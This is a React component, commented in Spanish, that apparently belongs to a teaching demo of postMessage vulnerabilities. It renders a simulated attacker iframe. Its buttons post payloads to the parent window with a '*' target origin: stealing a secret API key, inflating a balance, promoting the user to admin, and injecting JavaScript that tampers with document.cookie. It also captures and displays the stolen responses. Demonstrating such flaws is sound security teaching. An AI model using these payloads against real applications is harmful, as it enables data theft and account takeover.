'use client';

import { useState, useEffect } from 'react';

export default function AttackerFrame() {
  const [receivedMessages, setReceivedMessages] = useState<any[]>([]);
  const [stolenData, setStolenData] = useState<any>(null);
  
  // Escuchar mensajes
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      // Registrar todos los mensajes recibidos
      const newMessage = {
        origin: event.origin,
        data: event.data,
        timestamp: new Date().toLocaleTimeString()
      };
      
      setReceivedMessages(prev => [newMessage, ...prev].slice(0, 5));
      
      // Si recibimos un mensaje con datos sensibles, guardarlos
      if (event.data && event.data.action === 'secretKeyResponse') {
        setStolenData(event.data);
      }
    };
    
    window.addEventListener('message', handleMessage);
    
    return () => window.removeEventListener('message', handleMessage);
  }, []);
  
  // Ataques predefinidos
  const attacks = [
    {
      name: 'Robar clave secreta',
      payload: {
        action: 'getSecretKey'
      },
      description: 'Solicita la clave secreta API a la ventana principal'
    },
    {
      name: 'Modificar balance',
      payload: {
        action: 'updateBalance',
        amount: 9999999
      },
      description: 'Intenta cambiar el balance del usuario'
    },
    {
      name: 'Elevación de privilegios',
      payload: {
        action: 'updateAccount',
        accountInfo: {
          role: 'admin'
        }
      },
      description: 'Intenta cambiar el rol del usuario a administrador'
    },
    {
      name: 'Inyección de comandos',
      payload: {
        action: 'executeCommand',
        command: 'document.cookie = "session=hacked"; console.log(document.cookie);'
      },
      description: 'Intenta ejecutar código JavaScript en el contexto de la página principal'
    }
  ];
  
  // Función para enviar mensaje a la ventana padre
  const sendAttack = (payload: any) => {
    window.parent.postMessage(payload, '*');
  };
  
  return (
    <div className="p-4 bg-red-50 h-full">
      <h2 className="text-lg font-bold text-red-700 mb-3">Frame Malicioso Simulado</h2>
      
      <div className="mb-4">
        <h3 className="font-medium text-red-600 mb-2">Ataques disponibles:</h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {attacks.map((attack, index) => (
            <button
              key={index}
              onClick={() => sendAttack(attack.payload)}
              className="p-2 bg-red-200 hover:bg-red-300 text-red-800 rounded text-sm text-left"
              title={attack.description}
            >
              {attack.name}
            </button>
          ))}
        </div>
      </div>
      
      {stolenData && (
        <div className="mb-4 p-3 bg-yellow-100 border border-yellow-300 rounded">
          <h3 className="font-medium text-yellow-800 mb-1">🔑 Datos sensibles obtenidos:</h3>
          <pre className="bg-white p-2 rounded text-xs overflow-x-auto">
            {JSON.stringify(stolenData, null, 2)}
          </pre>
        </div>
      )}
      
      <div className="mt-4">
        <h3 className="font-medium text-red-600 mb-2">Mensajes recibidos:</h3>
        {receivedMessages.length > 0 ? (
          <div className="space-y-2 max-h-24 overflow-y-auto">
            {receivedMessages.map((msg, index) => (
              <div key={index} className="p-2 bg-white rounded border border-red-200 text-xs">
                <div className="flex justify-between text-gray-500 mb-1">
                  <span>Origen: {msg.origin}</span>
                  <span>{msg.timestamp}</span>
                </div>
                <pre className="text-xs overflow-x-auto">
                  {JSON.stringify(msg.data, null, 2)}
                </pre>
              </div>
            ))}
          </div>
        ) : (
          <p className="text-sm text-gray-500">No se han recibido mensajes.</p>
        )}
      </div>
      
      <div className="mt-4 text-xs text-gray-600">
        <p>Este iframe simula un contenido malicioso que intenta explotar la vulnerabilidad de postMessage.</p>
        <p>En un escenario real, este código estaría alojado en un dominio controlado por el atacante.</p>
      </div>
    </div>
  );
}